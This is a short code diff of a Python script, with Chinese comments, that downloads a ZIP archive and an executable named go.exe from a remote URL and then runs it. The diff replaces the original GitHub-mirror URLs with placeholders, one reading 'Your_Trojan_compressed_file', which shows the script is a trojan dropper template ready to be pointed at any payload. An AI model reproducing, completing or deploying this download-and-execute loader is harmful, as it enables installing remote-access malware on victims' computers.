@@ -89,7 +89,7 @@ def main():
         setup_directories()
 
         # 下载并解压ZIP文件
-        zip_url = "https://hub.gitmirror.com/https://github.com/Skywalker2333/remote2/archive/refs/tags/3.zip"
+        zip_url = "Your_Trojan_compressed_file" 
         response = requests.get(zip_url)
         if response.status_code == 200:
             if unzip_data(response.content, BASE_DIR):
@@ -98,7 +98,7 @@ def main():
             logging.error(f"ZIP下载失败，状态码: {response.status_code}")
 
         # 下载可执行文件
-        exe_url = "https://hub.gitmirror.com/https://github.com/Skywalker2333/remote2/raw/refs/heads/main/go.exe"
+        exe_url = "The address of Go.exe"
         exe_path = os.path.join(EXE_DIR, "go.exe")
         if download_file(exe_url, exe_path):
             # 执行程序
